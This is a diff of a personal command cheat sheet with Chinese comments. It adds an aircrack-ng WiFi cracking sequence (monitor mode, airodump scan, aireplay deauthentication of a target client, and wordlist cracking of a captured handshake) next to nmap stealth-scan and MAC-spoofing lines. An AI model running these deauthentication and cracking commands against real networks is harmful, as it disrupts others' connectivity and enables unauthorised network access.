@@ -45,7 +45,13 @@ nmap -sS -Pn -n -T2 --open --max-retries 1 -v 192.168.1.1
 --spoof-mac 源设备伪装
 
 ##aircrack-ng
-aircrack-ng -w ~/wifi/digits8.txt ~/wifi/hs/handshake.cap
+iw dev
+sudo airmon-ng check kill
+sudo airmon-ng start wlp0s20f3    #开启监听
+sudo airodump-ng wlp0s20f3mon     #全局扫描
+sudo aireplay-ng -0 5 -a [路由器MAC] -c [客户端MAC] wlp0s20f3mon   #-0 Deauth攻击 5 发送5组攻击包
+aircrack-ng -w ~/wifi/digits8.txt ~/wifi/hs/handshake.cap 
+
 
 gc #neovim快速标注
 grep -rn <file> #递归搜索文本且显示行数
